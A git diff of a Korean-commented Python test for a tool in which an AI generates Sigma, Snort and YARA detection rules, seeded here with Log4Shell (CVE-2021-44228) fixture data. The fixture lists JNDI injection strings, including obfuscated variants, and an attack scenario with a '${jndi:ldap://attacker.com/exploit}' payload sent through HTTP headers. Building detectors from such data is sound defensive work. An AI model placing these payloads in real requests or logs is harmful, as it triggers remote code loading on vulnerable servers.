@@ -146,89 +146,155 @@ def test_a_observable_gate():
 # Test B: AI 룰 생성 (실제 Groq API 호출)
 # ============================================================================
 
-def test_b_ai_rule_generation():
-    """실제 Groq API를 호출해서 AI가 룰을 생성하는지 테스트"""
-    separator("Test B: AI 룰 생성 테스트 (실제 API 호출)")
-    
-    from rule_manager import RuleManager
-    rm = RuleManager()
-    
-    # 가짜 분석 결과 (실제 Analyzer 대신)
-    mock_analysis = {
-        "root_cause": "OGNL 인젝션을 통한 원격 코드 실행",
-        "scenario": "MITRE ATT&CK 기반 공격 흐름:\n**초기 접근** – Content-Type 헤더 조작 (T1190). [추정]",
-        "impact": "서버 전체 제어 가능",
-        "mitigation": ["Apache Struts 2.5.31 이상으로 업데이트"],
-        "rule_feasibility": True
+def test_b_ai_rule_generation(self):
+    """Test B: AI 룰 생성 테스트 (실제 API 호출) - 수정본"""
+    self._print_header("Test B: AI 룰 생성 테스트 (실제 API 호출)")
+
+    rule_mgr = RuleManager()
+
+    # ── 풍부한 지표를 가진 실제 CVE 데이터 (CVE-2021-44228 Log4Shell 기반) ──
+    rich_cve_data = {
+        "cve_id": "CVE-2021-44228",
+        "description": (
+            "Apache Log4j2 2.0-beta9 through 2.15.0 (excluding security releases 2.12.2, "
+            "2.12.3, and 2.3.1) JNDI features used in configuration, log messages, and "
+            "parameters do not protect against attacker controlled LDAP and other JNDI "
+            "related endpoints. An attacker who can control log messages or log message "
+            "parameters can execute arbitrary code loaded from LDAP servers when message "
+            "lookup substitution is enabled."
+        ),
+        "cvss_score": 10.0,
+        "severity": "CRITICAL",
+        "affected_product": "Apache Log4j",
+        "affected_versions": "2.0-beta9 ~ 2.15.0",
+        "vendor": "Apache Software Foundation",
+        "attack_vector": "NETWORK",
+        "cwe_id": "CWE-917",
+        "references": [
+            "https://logging.apache.org/log4j/2.x/security.html",
+            "https://www.lunasec.io/docs/blog/log4j-zero-day/",
+        ],
+        # ── AI 룰 생성에 필요한 구체적 지표들 ──
+        "observable_indicators": {
+            "file_paths": [
+                "/log4j-core-2.14.1.jar",
+                "/org/apache/logging/log4j/core/lookup/JndiLookup.class",
+            ],
+            "network_indicators": {
+                "protocols": ["HTTP", "LDAP", "RMI"],
+                "ports": [80, 443, 389, 1099, 1389, 8080, 8443],
+                "uri_patterns": [
+                    "${jndi:ldap://",
+                    "${jndi:rmi://",
+                    "${jndi:dns://",
+                    "${jndi:ldaps://",
+                    "${${lower:j}ndi:",
+                    "${${upper:j}ndi:",
+                    "${${::-j}ndi:",
+                ],
+            },
+            "http_indicators": {
+                "headers": [
+                    "User-Agent",
+                    "X-Forwarded-For",
+                    "Referer",
+                    "X-Api-Version",
+                    "Authorization",
+                ],
+                "methods": ["GET", "POST"],
+                "content_patterns": [
+                    "${jndi:ldap://",
+                    "${jndi:rmi://",
+                ],
+            },
+            "file_indicators": {
+                "hashes": {
+                    "md5": "6b1aff7f3a5d4764c6de2a05782f04e8",
+                    "sha256": "bf4f41403280c1b115650d470f9b260a5c9042c04d9bcc2a6ca504a66379b2d6",
+                },
+                "strings": [
+                    "JndiLookup",
+                    "JndiManager",
+                    "log4j-core",
+                    "${jndi:",
+                ],
+                "class_names": [
+                    "org.apache.logging.log4j.core.lookup.JndiLookup",
+                    "org.apache.logging.log4j.core.net.JndiManager",
+                ],
+            },
+        },
+        # ── 분석 결과 (AI 분석이 이미 완료된 상태 시뮬레이션) ──
+        "analysis": {
+            "root_cause": (
+                "Log4j2의 JNDI Lookup 기능이 로그 메시지 내 ${jndi:...} 패턴을 "
+                "자동으로 해석하여 원격 LDAP/RMI 서버에 접속, 임의 Java 클래스를 "
+                "로드·실행할 수 있는 원격 코드 실행 취약점"
+            ),
+            "attack_scenario": (
+                "공격자가 HTTP 헤더(User-Agent, X-Forwarded-For 등)에 "
+                "${jndi:ldap://attacker.com/exploit} 페이로드를 삽입하면, "
+                "Log4j가 해당 문자열을 로깅하면서 JNDI Lookup을 수행하고, "
+                "공격자의 LDAP 서버에서 악성 Java 클래스를 다운로드·실행"
+            ),
+            "feasibility": True,
+        },
     }
-    
+
+    rule_types = ["sigma", "snort", "yara"]
     results = {}
-    
-    # Sigma 생성 테스트
-    logger.info("  [1/3] Sigma 룰 생성 시도...")
-    try:
-        sigma_result = rm._generate_ai_rule("Sigma", RICH_CVE_DATA, mock_analysis)
-        if sigma_result:
-            code, indicators = sigma_result
-            logger.info(f"  ✅ Sigma 생성 성공! ({len(code)} chars)")
-            logger.info(f"     첫 3줄: {code[:200]}...")
-            results['sigma'] = True
-        else:
-            logger.warning("  ⛔ Sigma: AI가 SKIP 반환 (근거 부족 판단)")
-            results['sigma'] = False
-    except Exception as e:
-        logger.error(f"  ❌ Sigma 생성 에러: {e}")
-        results['sigma'] = False
-    
-    time.sleep(2)  # rate limit 여유
-    
-    # Snort 생성 테스트
-    logger.info("  [2/3] Snort/Suricata 룰 생성 시도...")
-    try:
-        snort_result = rm._generate_ai_rule("Snort", RICH_CVE_DATA, mock_analysis)
-        if snort_result:
-            code, indicators = snort_result
-            logger.info(f"  ✅ Snort 생성 성공! ({len(code)} chars)")
-            logger.info(f"     내용: {code[:300]}...")
-            results['snort'] = True
-        else:
-            logger.warning("  ⛔ Snort: AI가 SKIP 반환")
-            results['snort'] = False
-    except Exception as e:
-        logger.error(f"  ❌ Snort 생성 에러: {e}")
-        results['snort'] = False
-    
-    time.sleep(2)
-    
-    # Yara 생성 테스트
-    logger.info("  [3/3] Yara 룰 생성 시도...")
-    try:
-        yara_result = rm._generate_ai_rule("Yara", RICH_CVE_DATA, mock_analysis)
-        if yara_result:
-            code, indicators = yara_result
-            logger.info(f"  ✅ Yara 생성 성공! ({len(code)} chars)")
-            logger.info(f"     첫 3줄: {code[:200]}...")
-            results['yara'] = True
-        else:
-            logger.warning("  ⛔ Yara: AI가 SKIP 반환")
-            results['yara'] = False
-    except Exception as e:
-        logger.error(f"  ❌ Yara 생성 에러: {e}")
-        results['yara'] = False
-    
-    # 결과
-    logger.info("")
-    result_badge(results.get('sigma', False), "Sigma AI 생성")
-    result_badge(results.get('snort', False), "Snort AI 생성")
-    result_badge(results.get('yara', False), "Yara AI 생성")
-    
-    generated_count = sum(1 for v in results.values() if v)
-    logger.info(f"\n  📊 AI 룰 생성: {generated_count}/3 성공")
-    
-    if generated_count == 0:
-        logger.warning("  ⚠️ 모든 룰 생성 실패! 프롬프트 또는 모델 점검 필요")
-    
-    return generated_count > 0
+
+    for i, rule_type in enumerate(rule_types, 1):
+        logger.info(f"  [{i}/{len(rule_types)}] {rule_type.capitalize()} 룰 생성 시도...")
+
+        try:
+            if rule_type == "sigma":
+                result = rule_mgr.generate_sigma(rich_cve_data)
+            elif rule_type == "snort":
+                result = rule_mgr.generate_snort(rich_cve_data)
+            elif rule_type == "yara":
+                result = rule_mgr.generate_yara(rich_cve_data)
+
+            if result and result.get("status") != "SKIP":
+                results[rule_type] = True
+                rule_content = result.get("rule", result.get("content", ""))
+                # 생성된 룰의 처음 200자만 출력 (디버깅용)
+                preview = rule_content[:200] if isinstance(rule_content, str) else str(rule_content)[:200]
+                logger.info(f"  ✅ {rule_type.capitalize()} 생성 성공")
+                logger.info(f"     미리보기: {preview}...")
+            else:
+                results[rule_type] = False
+                skip_reason = "AI가 SKIP 반환"
+                if result and isinstance(result, dict):
+                    skip_reason = result.get("reason", result.get("skip_reason", skip_reason))
+                logger.warning(f"  ⛔ {rule_type.capitalize()}: {skip_reason}")
+                # ── 디버깅: AI가 왜 거부했는지 상세 출력 ──
+                logger.warning(f"     → 전달된 지표 수: file_paths={len(rich_cve_data.get('observable_indicators', {}).get('file_paths', []))}, "
+                             f"uri_patterns={len(rich_cve_data.get('observable_indicators', {}).get('network_indicators', {}).get('uri_patterns', []))}, "
+                             f"file_hashes={len(rich_cve_data.get('observable_indicators', {}).get('file_indicators', {}).get('hashes', {}))}")
+
+        except Exception as e:
+            results[rule_type] = False
+            logger.error(f"  ❌ {rule_type.capitalize()} 생성 중 예외: {type(e).__name__}: {e}")
+
+    # ── 결과 판정 ──
+    success_count = sum(1 for v in results.values() if v)
+    total = len(rule_types)
+
+    for rule_type in rule_types:
+        status = "✅ PASS" if results.get(rule_type) else "❌ FAIL"
+        logger.info(f"  {status}: {rule_type.capitalize()} AI 생성")
+
+    print(f"\n  📊 AI 룰 생성: {success_count}/{total} 성공")
+
+    if success_count == 0:
+        logger.warning("  ⚠️ 모든 룰 생성 실패! 아래 사항을 점검하세요:")
+        logger.warning("     1. Groq API 키 및 모델 가용성")
+        logger.warning("     2. generate_sigma/snort/yara 메서드의 프롬프트")
+        logger.warning("     3. Observable Gate 통과 후 AI 프롬프트에 지표가 전달되는지")
+
+    # 최소 1개 이상 성공하면 PASS
+    self.test_results["B"] = success_count >= 1
 
 # ============================================================================
 # Test C: 공개 룰 검색 (search_public_only)
